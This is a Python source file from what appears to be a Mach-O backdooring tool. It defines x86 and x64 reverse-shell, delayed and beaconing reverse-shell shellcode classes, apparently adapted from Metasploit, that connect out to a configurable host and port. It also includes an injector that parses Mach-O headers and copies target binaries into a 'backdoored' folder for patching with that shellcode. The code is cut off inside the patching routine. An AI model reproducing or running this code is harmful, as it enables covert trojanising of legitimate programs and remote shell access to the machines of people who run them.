import os
import struct
import shutil
import subprocess


class macho_intel32_shellcode():
    """
    Mach-O Intel x32 shellcode class
    """

    def __init__(self, HOST='127.0.0.1', PORT=8080, jumpLocation=0x0, SUPPLIED_SHELLCODE=None, BEACON=15):
        self.HOST = HOST
        self.PORT = PORT
        self.jumpLocation = jumpLocation
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.BEACON = BEACON
        self.shellcode = ""

    def pack_ip_addresses(self):
        hostocts = []
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def delay_reverse_shell_tcp(self):
        #Modified from metasploit
        if self.PORT is None:
            print ("Must provide port")
            return False
        if self.HOST is None:
            print ("This payload requires a HOST parameter -H")
            return False

        self.shellcode2 = "\xB8\x74\x00\x00\x02\xcd\x80"   # put system time in eax
        self.shellcode2 += "\x05"                           # add eax, 15  for seconds
        self.shellcode2 += struct.pack("<I", self.BEACON)
        self.shellcode2 += ("\x89\xC3"                      # mov ebx, eax
                            "\xB8\x74\x00\x00\x02\xcd\x80"  # put system time in eax
                            "\x39\xD8"                      # cmp eax, ebx
                            "\x0F\x85\xf1\xff\xff\xff"      # jne back to system time
                            )
        self.shellcode2 += "\x68"
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += "\x68\xff\x02"
        self.shellcode2 += struct.pack(">H", self.PORT)
        self.shellcode2 += ("\x89\xe7\x31\xc0\x50"
                            "\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62"
                            "\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68"
                            "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x54\x53"
                            "\x50\xb0\x3b\xcd\x80"
                            )

        self.shellcode1 = ("\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2")
        self.shellcode1 += "\x0f\x84"
        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2
        return (self.shellcode1 + self.shellcode2)

    def beaconing_reverse_shell_tcp(self):
        #Modified from metasploit
        if self.PORT is None:
            print ("Must provide port")
            return False
        if self.HOST is None:
            print ("This payload requires a HOST parameter -H")
            return False

        self.shellcode2 = "\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2"  # FORK
        #fork
        self.shellcode2 += "\x0f\x84"                             # TO TIME CHECK
        self.shellcode2 += "\x41\x00\x00\x00"

        self.shellcode2 += "\x68"
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += "\x68\xff\x02"
        self.shellcode2 += struct.pack(">H", self.PORT)
        self.shellcode2 += ("\x89\xe7\x31\xc0\x50"
                            "\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62"
                            "\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68"
                            "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x54\x53"
                            "\x50\xb0\x3b\xcd\x80"
                            )

        #Time Check
        self.shellcode2 += "\xB8\x74\x00\x00\x02\xcd\x80"   # put system time in eax
        self.shellcode2 += "\x05"                           # add eax, 15  for seconds
        self.shellcode2 += struct.pack("<I", self.BEACON)
        self.shellcode2 += ("\x89\xC3"                      # mov ebx, eax
                            "\xB8\x74\x00\x00\x02\xcd\x80"  # put system time in eax
                            "\x39\xD8"                      # cmp eax, ebx
                            "\x0F\x85\xf1\xff\xff\xff"      # jne back to system time
                            "\xe9\x8E\xff\xff\xff\xff"      # jmp back to FORK
                            )

        #FORK to main program
        self.shellcode1 = ("\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2")
        self.shellcode1 += "\x0f\x84"
        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2
        return (self.shellcode1 + self.shellcode2)

    def reverse_shell_tcp(self):
        #Modified from metasploit
        if self.PORT is None:
            print ("Must provide port")
            return False
        if self.HOST is None:
            print ("This payload requires a HOST parameter -H")
            return False

        self.shellcode2 = "\x68"
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += "\x68\xff\x02"
        self.shellcode2 += struct.pack(">H", self.PORT)
        self.shellcode2 += ("\x89\xe7\x31\xc0\x50"
                            "\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62"
                            "\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68"
                            "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x54\x53"
                            "\x50\xb0\x3b\xcd\x80"
                            )

        self.shellcode1 = ("\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2")
        self.shellcode1 += "\x0f\x84"
        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2
        return (self.shellcode1 + self.shellcode2)

    def user_supplied_shellcode(self):
        if self.SUPPLIED_SHELLCODE is None:
            print "[!] User must provide shellcode for this module (-U)"
            return False
        else:
            supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
        self.shellcode2 = supplied_shellcode

        self.shellcode1 = ("\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2")
        self.shellcode1 += "\x0f\x84"
        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2
        return (self.shellcode1 + self.shellcode2)


class macho_intel64_shellcode():
    """
    Mach-O Intel x64 shellcode Class
    """

    def __init__(self, HOST, PORT, jumpLocation=0x0, SUPPLIED_SHELLCODE=None, BEACON=15):
        self.HOST = HOST
        self.PORT = PORT
        self.jumpLocation = jumpLocation
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.BEACON = BEACON
        self.shellcode = ""

    def pack_ip_addresses(self):
        hostocts = []
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def delay_reverse_shell_tcp(self):
        if self.PORT is None:
            print ("Must provide port")
            return False
        if self.HOST is None:
            print ("This payload requires a HOST parameter -H")
            return False

        #From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
        self.shellcode2 = "\xB8\x74\x00\x00\x02\x0f\x05"  # put system time in rax
        self.shellcode2 += "\x48\x05"
        self.shellcode2 += struct.pack("<I", self.BEACON)  # add rax, 15  for seconds
        self.shellcode2 += ("\x48\x89\xC3"                  # mov rbx, rax
                            "\xB8\x74\x00\x00\x02\x0f\x05"  # put system time in rax
                            "\x48\x39\xD8"                  # cmp rax, rbx
                            "\x0F\x85\xf0\xff\xff\xff"      # jne back to system time
                            )

        self.shellcode2 += ("\xb8"
                            "\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x49"
                            "\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48\x31\xf6\x56\x48\xbe"
                            "\x00\x02"
                            )

        self.shellcode2 += struct.pack(">H", self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ("\x56\x48\x89\xe6\x6a\x10\x5a\x0f"
                            "\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a"
                            "\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb8\x3b\x00\x00\x02"
                            "\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c"
                            "\x24\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05"
                            )

        self.shellcode1 = ("\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2")  # FORK()
        self.shellcode1 += "\x0f\x84"   # \x4c\x03\x00\x00"  # <-- Points to LC_MAIN/LC_UNIXTREADS offset
        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2

        return (self.shellcode1 + self.shellcode2)

    def reverse_shell_tcp(self):
        if self.PORT is None:
            print ("Must provide port")
            return False
        if self.HOST is None:
            print ("This payload requires a HOST parameter -H")
            return False

        #From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
        self.shellcode2 = ("\xb8"
                           "\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x49"
                           "\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48\x31\xf6\x56\x48\xbe"
                           "\x00\x02"
                           )

        self.shellcode2 += struct.pack(">H", self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ("\x56\x48\x89\xe6\x6a\x10\x5a\x0f"
                            "\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a"
                            "\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb8\x3b\x00\x00\x02"
                            "\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c"
                            "\x24\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05"
                            )

        self.shellcode1 = ("\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2")  # FORK()
        self.shellcode1 += "\x0f\x84"   # \x4c\x03\x00\x00"  # <-- Points to LC_MAIN/LC_UNIXTREADS offset
        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2

        return (self.shellcode1 + self.shellcode2)

    def beaconing_reverse_shell_tcp(self):
        if self.PORT is None:
            print ("Must provide port")
            return False
        if self.HOST is None:
            print ("This payload requires a HOST parameter -H")
            return False

        #From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
        self.shellcode2 = "\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2"  # FORK
        #fork
        self.shellcode2 += "\x0f\x84"                           # TO TIME CHECK
        self.shellcode2 += "\x6c\x00\x00\x00"

        #self.shellcode1 = "\xe9\x6c\x00\x00\x00"

        self.shellcode2 += ("\xb8"
                            "\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x49"
                            "\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48\x31\xf6\x56\x48\xbe"
                            "\x00\x02"
                            )
        self.shellcode2 += struct.pack(">H", self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ("\x56\x48\x89\xe6\x6a\x10\x5a\x0f"
                            "\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a"
                            "\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb8\x3b\x00\x00\x02"
                            "\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c"
                            "\x24\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05"
                            )
        #TIME CHECK

        self.shellcode2 += "\xB8\x74\x00\x00\x02\x0f\x05"  # put system time in rax
        self.shellcode2 += "\x48\x05"
        self.shellcode2 += struct.pack("<I", self.BEACON)  # add rax, 15  for seconds
        self.shellcode2 += ("\x48\x89\xC3"                  # mov rbx, rax
                            "\xB8\x74\x00\x00\x02\x0f\x05"  # put system time in rax
                            "\x48\x39\xD8"                  # cmp rax, rbx
                            "\x0F\x85\xf0\xff\xff\xff"      # jne back to system time
                            "\xe9\x60\xff\xff\xff\xff"      # jmp back to FORK
                            )

        self.shellcode1 = ("\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2")  # FORK()
        self.shellcode1 += "\x0f\x84"   # \x4c\x03\x00\x00"  # <-- Points to LC_MAIN/LC_UNIXTREADS offset

        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2

        return (self.shellcode1 + self.shellcode2)

    def user_supplied_shellcode(self):
        if self.SUPPLIED_SHELLCODE is None:
            print "[!] User must provide shellcode for this module (-U)"
            return False
        else:
            supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        #From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
        
        self.shellcode2 = supplied_shellcode

        self.shellcode1 = ("\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2")  # FORK()
        self.shellcode1 += "\x0f\x84"   # \x4c\x03\x00\x00"  # <-- Points to LC_MAIN/LC_UNIXTREADS offset
        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2

        return (self.shellcode1 + self.shellcode2)

    
    def delay_user_supplied_shellcode(self):
        if self.SUPPLIED_SHELLCODE is None:
            print "[!] User must provide shellcode for this module (-U)"
            return False
        else:
            supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        #From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
        self.shellcode2 = "\xB8\x74\x00\x00\x02\x0f\x05"  # put system time in rax
        self.shellcode2 += "\x48\x05"
        self.shellcode2 += struct.pack("<I", self.BEACON)  # add rax, 15  for seconds
        self.shellcode2 += ("\x48\x89\xC3"                  # mov rbx, rax
                            "\xB8\x74\x00\x00\x02\x0f\x05"  # put system time in rax
                            "\x48\x39\xD8"                  # cmp rax, rbx
                            "\x0F\x85\xf0\xff\xff\xff"      # jne back to system time
                            )

        self.shellcode2 += supplied_shellcode

        self.shellcode1 = ("\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2")  # FORK()
        self.shellcode1 += "\x0f\x84"   # \x4c\x03\x00\x00"  # <-- Points to LC_MAIN/LC_UNIXTREADS offset
        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2

        return (self.shellcode1 + self.shellcode2)


class machobin():

    def __init__(self, FILE, OUTPUT=None, SHELL=None, HOST="127.0.0.1", PORT=8080,
                 SUPPORT_CHECK=False, SUPPLIED_SHELLCODE=None, FAT_PRIORITY="x64",
                 INJECTOR=False, DELETE_ORIGINAL=False,
                 ):
        self.FILE = FILE
        self.OUTPUT = OUTPUT
        self.fat_hdrs = {}
        self.mach_hdrs = {}
        self.load_cmds = {}
        self.ImpValues = {}
        self.jumpLocation = 0x0
        self.PORT = PORT
        self.HOST = HOST
        self.SHELL = SHELL
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.SUPPORT_CHECK = SUPPORT_CHECK
        self.FAT_FILE = False
        self.FAT_PRIORITY = FAT_PRIORITY
        self.supported_CPU_TYPES = [0x7,  # i386
                                    0x01000007  # x64
                                    ]
        self.INJECTOR = INJECTOR
        self.DELETE_ORIGINAL = DELETE_ORIGINAL

    def run_this(self):
        'The Engine'
        self.bin = open(self.FILE, 'r+b')
        self.supported = ''
        if self.SUPPORT_CHECK is True:
            #Exit out either way
            if not self.FILE:
                print "You must provide a file to see if it is supported (-f)"
                return False
            try:
                self.support_check()
            except Exception, e:
                print 'Exception:', str(e), '%s' % self.FILE
            if self.supported is False:
                print "%s is not supported." % self.FILE
                return False
            else:
                print "%s is supported." % self.FILE
                return True
        self.support_check()
        result = self.patch_macho()
        return result

    def support_check(self):
        print "[*] Checking file support"
        check = self.get_structure()
        if check is False:
            self.supported = False

        for key, value in self.load_cmds.iteritems():
            self.ImpValues[key] = self.find_Needed_Items(value)
            if self.ImpValues[key]['text_segment'] == {}:
                print '[!] Not a proper Mach-O file'
                self.supported = False

    def output_options(self):
        """
        Output file check.
        """
        if not self.OUTPUT:
            self.OUTPUT = os.path.basename(self.FILE)

    def set_shells(self, MagicNumber, ):
        "This function sets the shellcode."

        print "[*] Looking for and setting selected shellcode"
        self.bintype = False
        if MagicNumber == '0xfeedface':
            #x86
            self.bintype = macho_intel32_shellcode
        elif MagicNumber == '0xfeedfacf':
            #x64
            self.bintype = macho_intel64_shellcode

        if not self.SHELL:
            print "You must choose a backdoor to add: "
            for item in dir(self.bintype):
                if "__" in item:
                    continue
                elif ("returnshellcode" == item
                      or "pack_ip_addresses" == item
                      or "eat_code_caves" == item
                      or 'ones_compliment' == item
                      or 'resume_execution' in item
                      or 'returnshellcode' in item):
                    continue
                else:
                    print "   {0}".format(item)
            return False
        if self.SHELL not in dir(self.bintype):
            print "The following %ss are available:" % str(self.bintype).split(".")[1]
            for item in dir(self.bintype):
                #print item
                if "__" in item:
                    continue
                elif ("returnshellcode" == item
                      or "pack_ip_addresses" == item
                      or "eat_code_caves" == item
                      or 'ones_compliment' == item
                      or 'resume_execution' in item
                      or 'returnshellcode' in item):
                    continue
                else:
                    print "   {0}".format(item)
            return False
        #else:
        #    shell_cmd = self.SHELL + "()"
        self.shells = self.bintype(self.HOST, self.PORT, self.jumpLocation, self.SUPPLIED_SHELLCODE)
        self.allshells = getattr(self.shells, self.SHELL)()
        self.shellcode = self.shells.returnshellcode()
        return self.shellcode

    def get_structure(self):
        '''This function grabs necessary data for the mach-o format'''
        self.binary_header = self.bin.read(4)
        if self.binary_header == "\xca\xfe\xba\xbe":
            print '[*] Fat File detected'
            self.FAT_FILE = True
            ArchNo = struct.unpack(">I", self.bin.read(4))[0]
            for arch in range(ArchNo):
                self.fat_hdrs[arch] = self.fat_header()
            for hdr, value in self.fat_hdrs.iteritems():
                if int(value['CPU Type'], 16) in self.supported_CPU_TYPES:
                    self.bin.seek(int(value['Offset'], 16), 0)
                    self.mach_hdrs[hdr] = self.mach_header()
                    self.load_cmds[hdr] = self.parse_loadcommands(self.mach_hdrs[hdr])
            if self.mach_hdrs is False:
                return False
        else:
            #Not Fat Header
            self.bin.seek(0)
            self.mach_hdrs[0] = self.mach_header()
            self.load_cmds[0] = self.parse_loadcommands(self.mach_hdrs[0])

    def fat_header(self):
        header = {}
        header["CPU Type"] = hex(struct.unpack(">I", self.bin.read(4))[0])
        header["CPU SubType"] = hex(struct.unpack(">I", self.bin.read(4))[0])
        header["Offset"] = hex(struct.unpack(">I", self.bin.read(4))[0])
        header["Size"] = hex(struct.unpack(">I", self.bin.read(4))[0])
        header["Align"] = hex(struct.unpack(">I", self.bin.read(4))[0])
        return header

    def mach_header(self):
        header = {}
        header['beginningOfHeader'] = self.bin.tell()
        try:
            header['MagicNumber'] = hex(struct.unpack("<I", self.bin.read(4))[0])
        except:
            print "[!] Not a properly formated Mach-O file"
            return False
        header['CPU Type'] = hex(struct.unpack("<I", self.bin.read(4))[0])
        header['CPU SubType'] = hex(struct.unpack("<I", self.bin.read(4))[0])
        header['File Type'] = hex(struct.unpack("<I", self.bin.read(4))[0])
        header['LOCLoadCmds'] = self.bin.tell()
        header['Load Cmds'] = hex(struct.unpack("<I", self.bin.read(4))[0])
        header['LOCSizeLdCmds'] = self.bin.tell()
        header['Size Load Cmds'] = hex(struct.unpack("<I", self.bin.read(4))[0])
        header['Flags'] = hex(struct.unpack("<I", self.bin.read(4))[0])
        if header['MagicNumber'] == '0xfeedfacf':
            header['Reserved'] = hex(struct.unpack("<I", self.bin.read(4))[0])
        header['endOfHeader'] = self.bin.tell()
        return header

    def parse_loadcommands(self, someHdrs):
        #print int(someHdrs['Load Cmds'], 16)
        overall_cmds = []
        for section in range(int(someHdrs['Load Cmds'], 16)):
            cmds = {}
            cmds['Command'] = struct.unpack("<I", self.bin.read(4))[0]
            cmds['CommandSize'] = struct.unpack("<I", self.bin.read(4))[0]
            cmds['LOCInFIle'] = self.bin.tell()
            cmds['DATA'] = self.bin.read(int(cmds['CommandSize']) - 8)
            cmds['last_cmd'] = self.bin.tell()
            overall_cmds.append(cmds)

        return overall_cmds

    def find_Needed_Items(self, theCmds):
        '''
        This method returns a dict with commands that we need
        for mach-o patching
        '''
        _tempDict = {}
        text_segment = {}
        text_section = {}
        LC_MAIN = {}
        LC_UNIXTREAD = {}
        LC_CODE_SIGNATURE = {}
        LC_DYLIB_CODE_SIGN_DRS = {}

        locationInFIle = 0
        last_cmd = 0
        for item in theCmds:
            locationInFIle = item['LOCInFIle']
            if item['DATA'][0:6] == "__TEXT" and item['Command'] == 0x01:
                text_segment = {
                    'segname': item['DATA'][0:0x10],
                    'VMAddress': item['DATA'][0x10:0x14],
                    'VMSize': item['DATA'][0x14:0x18],
                    'File Offset': item['DATA'][0x18:0x1C],
                    'File Size': item['DATA'][0x1C:0x20],
                    'MaxVMProt': item['DATA'][0x20:0x24],
                    'InitalVMProt': item['DATA'][0x24:0x28],
                    'NumberOfSections': item['DATA'][0x28:0x2C],
                    'Flags': item['DATA'][0x2C:0x30]
                }

                count = struct.unpack("<I", text_segment['NumberOfSections'])[0]
                i = 0
                while count > 0:
                    if '__text' in item['DATA'][0x30 + i:0x40 + i]:
                        text_section = {
                            'sectionName': item['DATA'][0x30 + i:0x40 + i],
                            'segmentName': item['DATA'][0x40 + i:0x50 + i],
                            'Address': item['DATA'][0x50 + i:0x54 + i],
                            'LOCAddress': locationInFIle + 0x50 + i,
                            'Size': item['DATA'][0x54 + i:0x58 + i],
                            'LOCTextSize': locationInFIle + 0x54 + i,
                            'Offset': item['DATA'][0x58 + i:0x5c + i],
                            'LocTextOffset': locationInFIle + 0x58 + i,
                            'Alignment': item['DATA'][0x5c + i:0x60 + i],
                            'Relocations': item['DATA'][0x60 + i:0x64 + i],
                            'NumberOfRelocs': item['DATA'][0x64 + i:0x68 + i],
                            'Flags': item['DATA'][0x68 + i:0x6c + i],
                            'Reserved1': item['DATA'][0x6c + i:0x70 + i],
                            'Reserved2': item['DATA'][0x70 + i:0x74 + i],
                        }
                        break
                    else:
                        count -= 1
                        i += 0x40

            elif item['DATA'][0:6] == "__TEXT" and item['Command'] == 0x19:
                text_segment = {
                    'segname': item['DATA'][0:0x10],
                    'VMAddress': item['DATA'][0x10:0x18],
                    'VMSize': item['DATA'][0x18:0x20],
                    'File Offset': item['DATA'][0x20:0x28],
                    'File Size': item['DATA'][0x28:0x30],
                    'MaxVMProt': item['DATA'][0x30:0x34],
                    'InitalVMProt': item['DATA'][0x34:0x38],
                    'NumberOfSections': item['DATA'][0x38:0x3C],
                    'Flags': item['DATA'][0x3c:0x40]
                }
                count = struct.unpack("<I", text_segment['NumberOfSections'])[0]
                i = 0
                while count > 0:

                    if '__text' in item['DATA'][0x40 + i:0x50 + i]:
                        text_section = {
                            'sectionName': item['DATA'][0x40 + i:0x50 + i],
                            'segmentName': item['DATA'][0x50 + i:0x60 + i],
                            'Address': item['DATA'][0x60 + i:0x68 + i],
                            'LOCAddress': locationInFIle + 0x60 + i,
                            'Size': item['DATA'][0x68 + i:0x70 + i],
                            'LOCTextSize': locationInFIle + 0x68 + i,
                            'Offset': item['DATA'][0x70 + i:0x74 + i],
                            'LocTextOffset': locationInFIle + 0x70 + i,
                            'Alignment': item['DATA'][0x74 + i:0x78 + i],
                            'Relocations': item['DATA'][0x78 + i:0x7c + i],
                            'NumberOfRelocs': item['DATA'][0x7c + i:0x80 + i],
                            'Flags': item['DATA'][0x80 + i:0x84 + i],
                            'Reserved1': item['DATA'][0x84 + i:0x88 + i],
                            'Reserved2': item['DATA'][0x88 + i:0x8c + i],
                            'Reserved3': item['DATA'][0x8c + i:0x90 + i],
                        }

                        break
                    else:
                        count -= 1
                        i += 0x4c

            if item['Command'] == 0x80000028:
                LC_MAIN = {
                    'LOCEntryOffset': locationInFIle,
                    'EntryOffset': item['DATA'][0x0:0x8],
                    'StackSize': item['DATA'][0x8:0x16]
                }
            elif item['Command'] == 0x00000005 and struct.unpack("<I", item['DATA'][0x0:0x4])[0] == 0x01:
                LC_UNIXTREAD = {
                    'LOCEntryOffset': locationInFIle,
                    'Flavor': item['DATA'][0x00:0x04],
                    'Count': item['DATA'][0x04:0x08],
                    'eax': item['DATA'][0x08:0x0C],
                    'ebx': item['DATA'][0x0C:0x10],
                    'ecx': item['DATA'][0x10:0x14],
                    'edx': item['DATA'][0x14:0x18],
                    'edi': item['DATA'][0x18:0x1C],
                    'esi': item['DATA'][0x1C:0x20],
                    'ebp': item['DATA'][0x20:0x24],
                    'esp': item['DATA'][0x24:0x28],
                    'ss': item['DATA'][0x28:0x2C],
                    'eflags': item['DATA'][0x2C:0x30],
                    'LOCeip': locationInFIle + 0x30,
                    'eip': item['DATA'][0x30:0x34],
                    'cs': item['DATA'][0x34:0x38],
                    'ds': item['DATA'][0x38:0x3C],
                    'es': item['DATA'][0x3C:0x40],
                    'fs': item['DATA'][0x40:0x44],
                    'gs': item['DATA'][0x44:0x48],
                }
            elif item['Command'] == 0x00000005 and struct.unpack("<I", item['DATA'][0x0:0x4])[0] == 0x04:
                LC_UNIXTREAD = {
                    'LOCEntryOffset': locationInFIle,
                    'Flavor': item['DATA'][0x00:0x04],
                    'Count': item['DATA'][0x04:0x08],
                    'rax': item['DATA'][0x08:0x10],
                    'rbx': item['DATA'][0x10:0x18],
                    'rcx': item['DATA'][0x18:0x20],
                    'rdx': item['DATA'][0x20:0x28],
                    'rdi': item['DATA'][0x28:0x30],
                    'rsi': item['DATA'][0x30:0x38],
                    'rbp': item['DATA'][0x38:0x40],
                    'rsp': item['DATA'][0x40:0x48],
                    'r8': item['DATA'][0x48:0x50],
                    'r9': item['DATA'][0x50:0x58],
                    'r10': item['DATA'][0x58:0x60],
                    'r11': item['DATA'][0x60:0x68],
                    'r12': item['DATA'][0x68:0x70],
                    'r13': item['DATA'][0x70:0x78],
                    'r14': item['DATA'][0x78:0x80],
                    'r15': item['DATA'][0x80:0x88],
                    'LOCrip': locationInFIle + 0x88,
                    'rip': item['DATA'][0x88:0x90],
                    'rflags': item['DATA'][0x90:0x98],
                    'cs': item['DATA'][0x98:0xA0],
                    'fs': item['DATA'][0xA0:0xA8],
                    'gs': item['DATA'][0xA8:0xB0],
                }

            if item['Command'] == 0x000001D:
                LC_CODE_SIGNATURE = {
                    'Data Offset': item['DATA'][0x0:0x4],
                    'Data Size': item['DATA'][0x0:0x8],
                }

            if item['Command'] == 0x0000002B:
                LC_DYLIB_CODE_SIGN_DRS = {
                    'Data Offset': item['DATA'][0x0:0x4],
                    'Data Size': item['DATA'][0x0:0x8],
                }

            if item['last_cmd'] > last_cmd:
                last_cmd = item['last_cmd']

        _tempDict = {'text_segment': text_segment, 'text_section': text_section,
                     'LC_MAIN': LC_MAIN, 'LC_UNIXTREAD': LC_UNIXTREAD,
                     'LC_CODE_SIGNATURE': LC_CODE_SIGNATURE,
                     'LC_DYLIB_CODE_SIGN_DRS': LC_DYLIB_CODE_SIGN_DRS,
                     'last_cmd': last_cmd
                     }

        return _tempDict

    def patch_macho(self):

        if self.supported is False:
            print self.FILE, "is not supported."
            return False

        self.output_options()

        if self.INJECTOR is False and self.DELETE_ORIGINAL is False:
            if not os.path.exists("backdoored"):
                os.makedirs("backdoored")

            os_name = os.name

            if os_name == 'nt':
                self.backdoorfile = "backdoored\\" + self.OUTPUT
            else:
                self.backdoorfile = "backdoored/" + self.OUTPUT

            shutil.copy2(self.FILE, self.backdoorfile)

        else:
            self.backdoorfile = self.FILE

        for key, value in self.mach_hdrs.iteritems():
            MagicNumber = value['MagicNumber']
            text_section = self.ImpValues[key]['text_section']
            last_cmd = self.ImpValues[key]['last_cmd']
            LC_MAIN = self.ImpValues[key]['LC_MAIN']
            LC_UNIXTREAD = self.ImpValues[key]['LC_UNIXTREAD']

            if self.binary_header == "\xca\xfe\xba\xbe":
                offset = int(self.fat_hdrs[key]['Offset'], 16)
            else:
                offset = 0x0
            LC_CODE_SIGNATURE = self.ImpValues[key]['LC_CODE_SIGNATURE']
            LC_DYLIB_CODE_SIGN_DRS = self.ImpValues[key]['LC_DYLIB_CODE_SIGN_DRS']

            patchx64 = True
            patchx86 = True

            if self.FAT_FILE is True and self.FAT_PRIORITY != 'ALL':
                if self.FAT_PRIORITY.lower() == 'x64':
                    patchx86 = False
                if self.FAT_PRIORITY.lower() == 'x86':
                    patchx64 = False

            with open(self.backdoorfile, 'r+b') as bin:
                if MagicNumber == '0xfeedfacf' and patchx64 is True:
                    print "[*] Patching x86_64 Mach-O Binary"
